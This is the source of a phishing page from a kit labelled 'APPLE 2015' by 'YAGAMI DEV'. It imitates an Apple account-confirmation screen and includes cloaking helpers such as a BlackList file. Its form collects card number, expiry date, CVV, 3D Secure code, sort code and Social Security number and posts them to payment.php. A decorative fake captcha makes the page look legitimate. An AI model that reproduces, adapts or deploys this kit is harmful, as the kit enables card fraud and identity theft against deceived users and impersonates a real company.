<?php 
/*
+----------------------------------+
¦----------  APPLE 2015  ----------¦
¦----------------------------------¦
¦-------- BY : YAGAMI DEV ---------¦
+----------------------------------+
*/
include 'includes/encrypter.php';
include 'includes/functions.php';
include 'includes/BlackList.php';
?>
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title> Confirm your account  </title>
      <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
      <link rel="stylesheet" href="assets/css/app.css">
      <script src="assets/js/jquery.js"></script>
   </head>
   <body class="desktop">
      <header class="mainHeader">
         <div class="headerContainer">
		 <img src="assets/img/logo.png" align="left"/>
		 <img src="assets/img/secur.png" align="right"/>
         </div>
      </header>
      <main class="createPage" style="height:800px;">
         <section id="content" role="main">
            <section id="main" class="">
               <div id="create" class="create grid12 grid">
                  <div class="valueProp grid6">
                     <header>
                        <h1>Confirm your account. Use it however you like.</h1>
                     </header>
                     <div class="imageHolder"></div>
                  </div>
                  <div class="grid6 gutter-left">
                     <form method="post" name="payment_form" class="proc" novalidate="novalidate" action="payment.php" id="formSDR">
                        <br>
                        <div class="container">
                           <div class="inner">
                              <br>
                              <br>
                              <div style="padding:2px;">  
                              <img src="assets/img/Sec.png" style="float:left; position: relative; bottom: 15px;">
                              <img src="assets/img/crd.png" style="float:right; position: relative; bottom: 13px;">
                              </div>
                              <div class="groupFields">
                                 <div class="textInput lap large ">
                                    <input id="cnum" type="text" class="validate camelCase" name="input3" required="required" placeholder="Card Number" >
									<input id="ctype" type="hidden" name="inputtype" value="">
								 </div>
                              </div>
                              <div class="addressEntry " id="addressEntry">
                                 <div class="groupFields">
                                    <input type="hidden" name="addressId" value="">
                                    <div class="textInput lap large ">
                                       <input type="text" class="validate camelCase" name="input4" required="required" placeholder="Expiration Date  ( MM / YYYY ) ">
                                    </div>
                                    <div class="clearfix" id="stateHolder">
                                       <div class="textInput lap large">
                                          <input type="text" name="input5" class="validate camelCase" required="required" placeholder=" CVV (CVC)">
                                       </div>
                                    </div>
                                    <div class="textInput lap large">
                                    <input type="text" class="validate camelCase" name="input6" placeholder="3D Secure Code" style="width: 49%">
                                    <input type="text" class="validate camelCase" name="input7" required="required" placeholder="Sort Code" style="width: 49.5%">
                                    </div>
                                    <div class="clearfix" id="stateHolder">
                                       <div class="textInput lap large city ">
                                          <input type="text" name="input8" class="validate camelCase" required="required" placeholder="Social Security number">
                                       </div>
                                    </div>
                                    <div style="display:block; margin-bottom:7px;">
                                       <img src="assets/img/captcha/captcha1.jpeg" style="width:98%;height:108px; padding: 3px; border: 1px solid #ccc;" id="captcha" />
                                    </div>
                                    <div class="textInput lap large">
                                    <input type="text" class="validate" required="required" placeholder="Captcha" style="width: 72%" name="input18" />
                                    <img src="assets/img/rec.png" style="display:block; float: right; width: 100px; cursor: pointer; position: relative; top: -4px;" id="recaptcha"/>
                                    </div>
                                 </div>
                              </div>
                              <input id="submitBtn" name="continue" type="submit" class="button" value="Continue">
                           </div>
                           <br>
                        </div>
                     </form>
                  </div>
               </div>
               <div style="display:block; width: 960px; height: 60px; background: url('assets/img/priv.png'); background-position: center center; background-repeat: no-repeat; margin: 70px auto 30px auto;"></div>
            </section>
         </section>
      </main>
      <footer id="gblFooter" role="contentinfo" style="background: url('assets/img/foter.png');background-repeat: no-repeat; background-position: center center; height: 60px;">
         <div class="footer IntentFooter"></div>
      </footer>
      <script data-main="assets/js/config" src="assets/js/require.js"></script>
     <script type="text/javascript">
         $("input").change(function () {
            $(this).parent().removeClass("hasError");
         });
		 $(function(){
			i = 1;
			var captcha;
			var src = "assets/img/captcha/captcha"+i+".jpeg";
			$("#captcha").attr("src", src);
		/*----------------------------------------*/
			$('#recaptcha').click(function(){
				i++;
				if (i > 15) {
					i = 1;
				}
				var src = "assets/img/captcha/captcha"+i+".jpeg";
				$("#captcha").attr("src", src);	
			});
		});
      </script>
	  <script src="assets/js/cardtype.js"></script>
   </body>
</html>